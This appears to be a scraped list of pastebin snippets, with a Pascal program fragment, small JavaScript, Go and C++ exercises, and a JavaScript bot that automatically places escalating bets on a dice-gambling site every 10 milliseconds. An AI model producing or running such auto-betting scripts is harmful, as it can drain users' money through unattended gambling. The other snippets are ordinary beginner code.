      MYAPP:TMYAPP;
BEGIN
   MYAPP.INIT('Cryptic Crossword');
   MYAPP.RUN;
   MYAPP.DONE;
END.
"
bdzSwTZW,Untitled,Petar_Matev,JavaScript,Saturday 20th of January 2024 02:39:21 AM CDT,"function fishTank(input) {
  let length = parseInt(input[0]);
  let width = parseInt(input[1]);
  let height = parseInt(input[2]);
  let percentage = parseFloat(input[3]);

  let capacity = (length * width * height) / 1000;
  let remainingCapacity = capacity * (1 - (percentage / 100));

  console.log(remainingCapacity);

}"
YMCF5JYR,snowzy,coinwalk,JavaScript,Saturday 20th of January 2024 12:31:44 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/800).toFixed(8));
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*5.9);
var eights = (base*6.9);
var muck = 4;
var upper = 5.9;
var downer = 11.9;
var adrian = false;
var bob = oldestbal;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.clear();
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    adrian = true;
    fart = parseFloat(bellance);
    bob = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*downer)))&&(!adrian)){
    upper = 7.9;
    downer = 9.9;
    fart = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*downer)))&&(adrian)){
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=bob)&&(bellance!=fart)&&(bellance>=james)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=0)&&(bellance!=fart)&&(bellance>=james)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if ((botplus>=(base*8))&&(bellance!=fart)&&(bellance>=james)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    james = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (bellance>=(oldestbal*24)) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();"
Wn1gRqS4,Find duplicates in a struct array on multiple fields,cydside,Go,Saturday 20th of January 2024 12:24:32 AM CDT,"package main

import (
	""fmt""
)

// Define your struct
type Person struct {
	Name string
	Age  int
	City string
}

func main() {
	// Create an array of structs
	people := []Person{
		{""John"", 25, ""New York""},
		{""Jane"", 30, ""London""},
		{""John"", 30, ""New York""},
		{""Bob"", 22, ""Paris""},
		{""Jane"", 30, ""London""},
	}

	// Create a map to store the encountered values
	seen := make(map[struct{ Name, City string }]bool)

	// Iterate through the array
	for _, person := range people {
		// Check if the combination of Name and City has been seen before
		key := struct{ Name, City string }{person.Name, person.City}
		if seen[key] {
			fmt.Printf(""Duplicate found: %+v\n"", person)
		} else {
			// Mark the current combination as seen
			seen[key] = true
		}
	}
}
"
HMZ9NVK5,Untitled,35657,C++,Saturday 20th of January 2024 12:18:22 AM CDT,"
#include <iostream>
#include <math.h>

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	double a, b;
	char key;

	cout << ""Введите первое число: "";
	cin >> a;
	
	cout << ""Введите второе число: "";
	cin >> b;

	cout << ""Введите операцию: "";
	cin >> key;

	if (key == '+') {
		cout << a + b << endl;
	}
	else if (key == '-') {
		cout << a - b << endl;
	}
	else if (key == '*') {
		cout << a * b << endl;
	}
	else if (key == '/') {
		if (b != 0) {
			cout << a / b << endl;
		}
		else {
			cout << ""На нуль делить нельзя"" << endl;
		}
	}
	else {
		cout << ""Некорректный ввод"" << endl;
	}
}

"
